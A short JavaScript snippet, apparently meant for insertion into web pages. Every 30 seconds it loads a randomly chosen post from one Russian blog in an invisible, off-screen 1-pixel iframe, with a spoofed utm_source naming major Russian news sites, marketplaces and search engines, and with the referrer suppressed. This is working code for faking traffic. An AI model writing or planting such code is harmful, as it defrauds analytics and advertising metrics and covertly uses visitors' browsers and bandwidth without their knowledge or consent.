  const urls = [
    "https://www.skilllift.ru/2025/02/10.html",
    "https://www.skilllift.ru/2025/02/blog-post.html",
    "https://www.skilllift.ru/2025/02/blog-post_21.html",
    "https://www.skilllift.ru/2025/02/blog-post_72.html",
    "https://www.skilllift.ru/2025/02/2025.html",
    "https://www.skilllift.ru/2025/02/blog-post_88.html",
    "https://www.skilllift.ru/2025/02/vs.html",
    "https://www.skilllift.ru/2025/02/hr.html",
    "https://www.skilllift.ru/2025/02/5.html",
    "https://www.skilllift.ru/2025/02/blog-post_16.html"
  ];

  const sources = [
    "utro.ru", "mail.rambler.ru", "vz.ru", "ozon.ru", "rambler.ru", "pikabu.ru",
    "rsport.ria.ru", "radiosputnik.ria.ru", "kp.ru", "lenta.ru", "avito.ru",
    "drom.ru", "habr.com", "news.mail.ru", "realty.ria.ru", "rbc.ru",
    "aliexpress.ru", "otvet.mail.ru", "gazeta.ru", "smi2.ru", "kommersant.ru",
    "mk.ru", "ria.ru", "yandex", "google", "bing", "vk", "fotostrana", "ok", "zen"
  ];

  function loadIframe() {
    const page = urls[Math.floor(Math.random() * urls.length)];
    const source = sources[Math.floor(Math.random() * sources.length)];
    const fullUrl = page + "?utm_source=" + encodeURIComponent(source);

    const iframe = document.createElement("iframe");
    iframe.src = fullUrl;
    iframe.style = "width:1px; height:1px; opacity:0.01; position:absolute; left:-9999px;";
    iframe.referrerPolicy = "no-referrer";
    document.body.appendChild(iframe);
  }

  // Загружаем iframe сразу и повторяем каждые 30 сек
  loadIframe();
  setInterval(loadIframe, 30000);
